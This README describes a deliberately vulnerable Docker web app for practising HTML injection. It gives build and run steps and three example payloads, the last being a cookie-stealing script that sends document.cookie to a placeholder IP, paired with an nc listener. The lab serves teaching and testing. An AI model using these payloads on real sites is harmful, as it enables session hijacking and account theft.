# HTML Injection   

A simple docker container that has a web app that is susceptible to HTML injection.

## Build
```
docker build -t html-injection .
```

## Usage
```
docker run --rm -d -p 5000:5000 --name html-injection -t html-injection
```

## Examples
### 1) Simple HTML Injection
Click the "Click to enter your name" button and insert some simple HTML tags.

```
<h1>Plumpmonkey</h1>
```

### 2) Defacement of the page
You can import pictures using a script.

```
<style> body {background-image: url('https://uwe-cyber.github.io/images/uwecyber.png');}</style>
```

### 3) Stealing Cookies
Export the session cookie to a remote server.

Have a nc listener running on port 5001 on your local machine.

```
nc -lvp 5001
```

Then use the following script to export the cookie to your local machine. Note the `removeAttribute` is used to prevent the script from running more than once.

```
<img src=x onerror="this.src='http://<IP ADDRESS>:5001/?'+document.cookie; this.removeAttribute('onerror');">
```
